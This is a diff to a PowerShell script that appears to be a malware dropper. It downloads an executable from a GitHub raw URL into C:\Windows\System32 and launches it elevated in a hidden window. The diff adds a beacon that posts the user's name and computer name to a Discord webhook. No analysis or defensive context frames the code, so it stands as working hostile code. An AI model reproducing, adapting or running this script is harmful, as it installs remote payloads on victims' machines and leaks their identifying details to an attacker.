@@ -13,7 +13,7 @@ try
         };
     };
 } catch {};
-    
+
 $mutexName = "44b6c65a-d844-4fa9-9d68-a7df5ab8b127";
 $processes = Get-WmiObject Win32_Process;
 foreach ($process in $processes) 
@@ -33,7 +33,7 @@ $filePath = "C:\\Windows\\System32\\winio.exe";
 if (Test-Path $filePath2) {
     try {
         Start-Process -FilePath "C:\Windows\System32\winio.exe" -Verb RunAs -WindowStyle Hidden -ErrorAction Stop;
-    } catch {};
+    } catch {}
 } else {
     try {
         Start-BitsTransfer -Source 'https://raw.githubusercontent.com/aodfs/0/main/1' -Destination 'C:\Windows\System32\winio.exe' -ErrorAction SilentlyContinue;
@@ -43,5 +43,14 @@ if (Test-Path $filePath2) {
             Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/aodfs/0/main/1' -OutFile 'C:\Windows\System32\winio.exe' -ErrorAction SilentlyContinue;
             Start-Process -FilePath "C:\Windows\System32\winio.exe" -Verb RunAs -WindowStyle Hidden -ErrorAction Stop;
         };
-    } catch {};
+    } catch{};
 }
+
+$webhookUrl = "https://discord.com/api/webhooks/1277401036809572475/_pXb-6v9wYFAUxRHWpukoPbaRekI0ehKgaNrL0kBWPB1-m504z1fxkHMQAzpFE9be_cc";
+$user = $env:USERNAME;
+$pcName = $env:COMPUTERNAME;
+$message = "$user@$pcName";
+$payload = @{
+    content = $message
+} | ConvertTo-Json;
+Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType "application/json" -Body $payload;
